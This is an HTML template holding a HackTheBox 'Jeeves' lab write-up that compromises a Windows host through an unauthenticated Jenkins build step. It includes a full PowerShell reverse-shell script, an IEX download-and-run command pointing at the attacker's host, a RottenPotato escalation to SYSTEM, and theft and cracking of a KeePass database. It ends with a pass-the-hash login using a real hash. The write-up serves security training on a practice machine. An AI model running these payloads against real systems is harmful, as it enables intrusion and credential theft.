@@ -1,0 +1,293 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Jeeves</h1>
+    <p class="text">Difficulty : Medium | UserDifficulty : 4.4</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 10.0
+|_http-title: Ask Jeeves
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open  msrpc        Microsoft Windows RPC
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+|_http-title: Error 404 Not Found
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)</code></pre></div>
+
+<p class="text">The target machine is hosting two http server on 80 & 50000. This is why we have to scan all ports.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jeeves/1.png' %}" alt="">
+    <p class="text">We can see jenkins character. We might find jenkins page with enumeration.</p>
+</div>
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP -t 70</u>
+===============================================================
+/Index.html           (Status: 200) [Size: 503]
+/error.html           (Status: 200) [Size: 50]
+/index.html           (Status: 200) [Size: 503]
+/index.html           (Status: 200) [Size: 503]
+
+===============================================================</code></pre></div>
+
+<p class="text">Though it returned 2 types of pages, there is no interesting information.</p>
+<p class="text">We may find new info with stopping request with burpsuit. However, when I stopped request query with proxy and search word with input field, it doesn't return hanging request. Also, the webpage rendered error page ignoring proxy. Therefore, I concluded the port 80 is rabbit-hole, and main target is port 50000.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jeeves/2.png' %}" alt="">
+    <p class="text">As assumed, I could stop this page's GET request with burpsuite. Though the first page returned 404 response, we should find directory with enumeration. Just in case, let's use large wordlist to not miss a new page.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP:50000 -t 70</u>
+===============================================================
+/askjeeves            (Status: 302) [Size: 0] [--&gt; http://10.129.228.112:50000/askjeeves/]</code></pre></div>
+
+<p class="text">As expected, I found askjeeves page.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jeeves/3.png' %}" alt="">
+    <p class="text">Luckily, this page doesn't require login to browse sensitive tabs. Also, it's well know that the jenkins has command execution functionality and CLI. Therefore, we woun't struggle to get reverse shell connection.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jeeves/4.png' %}" alt="">
+    <p class="text">Pressing the tab <u>New item</u> show us several method to build project. We can ececute command from this interface. Enter name and select Freestyle project. Then, press OK button.</p>
+</div>
+
+<p class="text">Though there are several way to get reverse shell with this functionality, this time I'll use little complex way for stable connection.</p>
+
+<p class="text">First, we need to prepare the file which include reverse shell command. Please replace your IP address. I named this file shell.ps1.</p>
+<div class="code-box"><pre><code>&#36;client = New-Object System.Net.Sockets.TCPClient('10.10.16.38',4444);&#36;stream = &#36;client.GetStream();[byte[]]&#36;bytes = 0..65535|%{0};while((&#36;i = &#36;stream.Read(&#36;bytes, 0, &#36;bytes.Length)) -ne 0){;&#36;data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(&#36;bytes,0, &#36;i);&#36;sendback = (iex &#36;data 2>&1 | Out-String );&#36;sendback2  = &#36;sendback + 'PS ' + (pwd).Path + '> ';&#36;sendbyte = ([text.encoding]::ASCII).GetBytes(&#36;sendback2);&#36;stream.Write(&#36;sendbyte,0,&#36;sendbyte.Length);&#36;stream.Flush()};&#36;client.Close()</code></pre></div>
+<p class="text">Then, we can trigger this code with command IEX.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/jeeves/5.png' %}" alt="">
+    <img src="{% static 'EthHack/images/jeeves/6.png' %}" alt="">
+</div>
+
+<p class="text">Then, scroll donw the build page and select <u>Execute Windows batch commnad</u>, and enter command below</p>
+<div class="code-box"><pre><code>powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.38:8000/shell.ps1')</code></pre></div>
+
+<p class="text">This command get string from our file shell.ps1, and evaluate it. Therefore, we can execute command of shell.ps1 with PowerShell.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/jeeves/7.png' %}" alt="">
+    <p class="text">After saving the project, open http server on where you have shell.ps1 file, and also open port for accepting reverse shell. Then, press <u>Build Now</u>.</p>
+</div>
+<p class="text">Then we'll see HTTP GET request from target machine, and reverse shell connection soon.</p>
+<div class="code-box"><pre><code>└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.228.112 - - [04/Nov/2025 02:51:33] "GET /shell.ps1 HTTP/1.1" 200 -
+
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.38] from (UNKNOWN) [10.129.228.112] 49678
+PS C:\Users\Administrator\.jenkins\workspace\rev> whoami
+jeeves\kohsuke</code></pre></div>
+
+<p class="text">We got jeeves user.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">Actually, we have 2 (or more) way to get privileged account. First one abuse SeImpersonatePrivilege, and second one abuse Pass the Hash.</p>
+<h2 class="subtitle">PrivEsc 1</h2>
+<div class="code-box"><pre><code>PS C:\Users\Administrator\.jenkins\workspace\rev> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+<u>SeImpersonatePrivilege</u>        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled</code></pre></div>
+
+<p class="text">The user kohsuke has SeImpersonatePrivilege. Therefore, we can use RottenPotato for bat file execution. Before move, pls install MSFRotetnPotato.</p>
+<p class="text">First we prepare malicious bat file. Actually we used the same code before.</p>
+<div class="code-box"><pre><code>└─$ cat shell.bat
+powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.16.38:8000/shell.ps1')</code></pre></div>
+<p class="text">Let's serve MSFRotetnPotato and this bat file to the target machine.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-smbserver share . -smb2support -username a -password a</code></pre></div>
+
+<div class="code-box"><pre><code>PS C:\Users\Administrator\.jenkins\workspace\rev> cd C:\Users\kohsuke\Downloads
+PS C:\Users\kohsuke\Downloads> net use \\10.10.16.38\share /user:a a
+PS C:\Users\kohsuke\Downloads> copy \\10.10.16.38\share\MSFRottenPotato.exe
+PS C:\Users\kohsuke\Downloads> copy \\10.10.16.38\share\shell.bat</code></pre></div>
+
+<p class="text">Then, open http server and nc the same as before.</p>
+
+<div class="code-box"><pre><code>└─$ python3 -m http.server 8000
+└─$ nc -lvnp 4444</code></pre></div>
+
+<p class="text">Finally, we can execute bat file with RottenPotato.</p>
+<div class="code-box"><pre><code>PS C:\Users\kohsuke\Downloads>  C:\users\kohsuke\Downloads\MSFRottenPotato.exe * C:\users\kohsuke\Downloads\shell.bat
+CreateIlok: 0 0
+CreateDoc: 0 0
+connect sock
+start RPC  connection
+COM -> bytes received: 116
+RPC -> bytes Sent: 116
+RPC -> bytes received: 84
+COM -> bytes sent: 84
+COM -> bytes received: 24
+RPC -> bytes Sent: 24
+RPC -> bytes received: 144
+COM -> bytes sent: 144
+COM -> bytes received: 135
+RPC -> bytes Sent: 135
+RPC -> bytes received: 216
+COM -> bytes sent: 216
+COM -> bytes received: 251
+RPC -> bytes Sent: 251
+RPC -> bytes received: 212
+COM -> bytes sent: 212
+COM -> bytes received: 72
+RPC -> bytes Sent: 72
+RPC -> bytes received: 60
+COM -> bytes sent: 60
+COM -> bytes received: 42
+RPC -> bytes Sent: 42
+RPC -> bytes received: 56
+COM -> bytes sent: 56
+CoGet: -2147024891 0
+[+] authresult != -1
+[+] Elevated Token tye:2
+[+] DuplicateTokenEx :1  1300
+[+] Duped Token type:1
+[+] Running C:\users\kohsuke\Downloads\shell.bat sessionId 1 
+[+] CreateProcessWithTokenW OK
+Auth result: 0
+Return code: 0
+Last error: 0</code></pre></div>
+
+
+<p class="text">Then, you'll see reverse shell.</p>
+
+<div class="code-box"><pre><code>└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.228.112 - - [04/Nov/2025 02:51:33] "GET /shell.ps1 HTTP/1.1" 200 -
+
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.38] from (UNKNOWN) [10.129.228.112] 49687
+PS C:\Windows\system32> whoami
+nt authority\system</code></pre></div>
+
+<p class="text">We can find root text on the C:\Users\Administrator\Desktop. But you need to read the text from stream.</p>
+<div class="code-box"><pre><code>PS C:\Users\Administrator\Desktop> cmd /c dir /R
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/08/2017  09:05 AM    &lt;DIR>          .
+11/08/2017  09:05 AM    &lt;DIR>          ..
+12/24/2017  02:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+11/08/2017  09:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+               2 Dir(s)   2,653,818,880 bytes free</code></pre></div>
+
+               <div class="code-box"><pre><code>PS C:\Users\Administrator\Desktop>  Get-Content "hm.txt" -Stream "root.txt"
+afbx....</code></pre></div>
+
+
+
+<h2 class="subtitle">PrivEsc 2</h2>
+<div class="code-box"><pre><code>PS C:\Users\kohsuke\Documents> dir
+
+
+    Directory: C:\Users\kohsuke\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        9/18/2017   1:43 PM           2846 CEH.kdbx  </code></pre></div>
+
+<p class="text">We can find kdbx file, which is the KeePass 2.x database file format. We can find passwords reading this file.</p>
+<p class="text">First we need to install this file to our local machine.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-smbserver share . -smb2support -username a -password a</code></pre></div>
+<div class="code-box"><pre><code>PS C:\Users\kohsuke\Documents> net use \\YOUR_IP\share /user:a a
+PS C:\Users\kohsuke\Documents> copy CEH.kdbx \\YOUR_IP\share</code></pre></div>
+<p class="text">Then you have copied this file. </p>
+
+<div class="code-box"><pre><code>└─$ kpcli --kdb CEH.kdbx
+Provide the master password:</code></pre></div>
+
+<p class="text">We need password to open this file, but we can crack it wiht john.</p>
+
+<div class="code-box"><pre><code>└─$ keepass2john CEH.kdbx > CEH.hash
+└─$ john CEH.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+...
+<u>moonshine1</u>       (CEH)</code></pre></div>
+
+<p class="text">We got password.</p>
+
+<div class="code-box"><pre><code>└─$ kpcli --kdb CEH.kdbx
+Provide the master password: *************************
+kpcli:/> find .
+=== Entries ===
+0. Backup stuff                                                           
+1. Bank of America                                   www.bankofamerica.com
+2. DC Recovery PW                                                         
+3. EC-Council                               www.eccouncil.org/programs/cer
+4. It's a secret                                 localhost:8180/secret.jsp
+5. Jenkins admin                                            localhost:8080
+6. Keys to the kingdom                                                    
+7. Walmart.com                                             www.walmart.com</code></pre></div>
+
+<p class="text">There are several user data. But we can find NLTM hash in 0. Backup stuff.</p>
+
+<div class="code-box"><pre><code>kpcli:/> show -f 0
+
+ Path: /CEH/
+Title: Backup stuff
+Uname: ?
+ Pass: <u>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</u>
+  URL: 
+Notes:</code></pre></div>
+
+<p class="text">We can test if we can use this hash for logon.</p>
+<div class="code-box"><pre><code>└─$ crackmapexec smb 10.129.228.112 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB         10.129.228.112  445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)</code></pre></div>
+
+<p class="text">This indicates this hash can be used for admin. We can simply pass the hash to logon as Admin.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.228.112 cmd.exe
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.228.112.....
+[*] Found writable share ADMIN$
+[*] Uploading file mAStzTWQ.exe
+[*] Opening SVCManager on 10.129.228.112.....
+[*] Creating service sfiD on 10.129.228.112.....
+[*] Starting service sfiD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system</code></pre></div>
+
+<p class="text">We can read root.txt as the same before.</p>
+
+
+
+</body>
+</html>
